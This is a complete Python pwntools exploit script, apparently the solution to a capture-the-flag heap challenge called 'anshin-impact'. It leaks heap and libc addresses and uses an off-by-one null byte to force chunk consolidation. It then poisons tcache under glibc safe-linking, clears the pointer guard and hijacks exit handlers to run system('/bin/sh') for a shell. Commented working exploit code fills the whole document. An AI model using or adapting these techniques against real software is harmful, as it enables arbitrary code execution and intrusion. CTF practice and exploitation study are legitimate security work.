#!/usr/bin/env python3

from pwn import *

exe = ELF("./anshin-impact_patched")
libc = ELF("./libc.so.6")

context.binary = exe

def conn():
    if args.LOCAL:
        p = process([exe.path])
        if args.GDB:
            gdb.attach(p)
            pause()
    else:
        p = remote("localhost", 8004)

    return p

def encrypt(pos, ptr):
    return (pos >> 12) ^ ptr

def decrypt(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

def purchase(p, item):
    p.sendline(b"2")
    p.sendline(b"1")
    p.sendline(item)

def edit(p, idx, item):
    p.sendline(b"2")
    p.sendline(b"2")
    p.sendline(str(idx).encode())
    p.sendline(item)

def use(p, idx):
    p.sendline(b"4")
    p.sendline(str(idx).encode())

def view(p, idx):
    p.clean()
    p.sendline(b"3")
    p.recvuntil(f"{idx}: ".encode())
    return p.recvline()[:-1]

def wish(p):
    p.sendline(b"2")
    p.sendline(b"3")
    time.sleep(1)

def level1(p):
    p.sendline(b"1")

    p.sendline(b"1")
    p.sendline(b"1")
    p.sendline(b"1")


def main():
    p = conn()

    # good luck pwning :)
    p.sendline(b"a"*32)

    # clear lvl 1 to earn enough gold for heap exploit
    level1(p)

    # leak heap base
    p.clean()
    purchase(p, b"Poison") # get heap pointer (which is next to username)
    p.recvuntil(b"a"*32)
    leak = u64(p.recvuntil(b"'s", drop=True).ljust(8, b"\x00"))
    heap_base = leak - 0x2a0
    print(hex(heap_base))
    use(p, 0)

    # setup the heap
    for i in range(7):
        # fill up tcache so that the consolidated chunk doesn't go to tcache
        # but triggers consolidate instead
        purchase(p, b"Poison" + b"a"*(0xf0 - 6)) # use poison to get hp to 0

    purchase(p, b"a"*0x1f8) # 7 - our controlled chunk
    purchase(p, b"a"*0xf0) # 8 - consolidated chunk
    purchase(p, b"a"*0x20) # 9 - separate from wilderness
    for i in range(7):
        use(p, i)

    # the off-by-one will change chunk_8 PREV_INUSE bit to 0 cos of the appended null byte
    payload = flat(
        0x0, 0x1f0, # 0x1f0 must match the size to pass corrupted size vs. prev_size
        heap_base + 0x9c0, heap_base + 0x9c0, # p = heap_base + 0x9c0, fd->bk == p, bk->fd == p to pass corrupted double-linked list
        b"a"*0x1d0,
        0x1f0, # this size (prev_size) must be such that chunk_8 - 0x1f0 points to the fd and bk ptrs
    )
    edit(p, 7, payload)

    # trigger consolidate
    use(p, 8)

    wish(p)

    # leak libc base (chunk_8 is in unsorted bin)
    wish(p)

    leak = u64(view(p, 1).ljust(8, b"\x00"))
    libc_base = leak - 0x219fc0
    print(hex(libc_base))
    libc.address = libc_base

    # target0: ptr_guard = 0
    target0 = encrypt(heap_base + 0xa50, libc_base - 0x2890)
    write0 = p64(0)

    # target1: exit_funcs overwrite
    target1 = encrypt(heap_base + 0xa70, libc_base + 0x21af00)
    write1 = flat(
        0, 1,
        4, rol(libc.sym.system, 0x11, 64),
        next(libc.search(b"/bin/sh\x00"))
    )

    # extra 1 chunk per tcache bin so that we can overwrite an existing chunk ptr
    # if we only used 1 chunk per bin, tcache will see that number of chunks freed < number of chunks we want
    # and not allocate us target0 and target1 (it will be taken from new addresses instead)
    purchase(p, b"a"*0x10) # 2
    purchase(p, b"a"*0x30) # 3
    purchase(p, b"b"*0x10) # 4
    purchase(p, b"c"*0x30) # 5
    use(p, 2)
    use(p, 3)
    use(p, 4)
    use(p, 5)

    # use overlapping chunks to control fd ptr of poisoned chunks
    payload = flat(
        0, 0x21,
        0, 0,
        0, 0x21,
        0, 0,
        0, 0x41,
        0, 0,
        0, 0,
        0, 0,
        0, 0x21,
        target0, 0,
        0, 0x41,
        target1, 0,
    )
    edit(p, 7, payload)

    purchase(p, b"b"*0x10)
    purchase(p, b"c"*0x30)

    purchase(p, b"\x00"*0x10) # 4
    purchase(p, b"\x00"*0x30) # 5

    edit(p, 4, write0)
    edit(p, 5, write1)

    # trigger exit
    p.sendline(b"1")

    p.interactive()


if __name__ == "__main__":
    main()
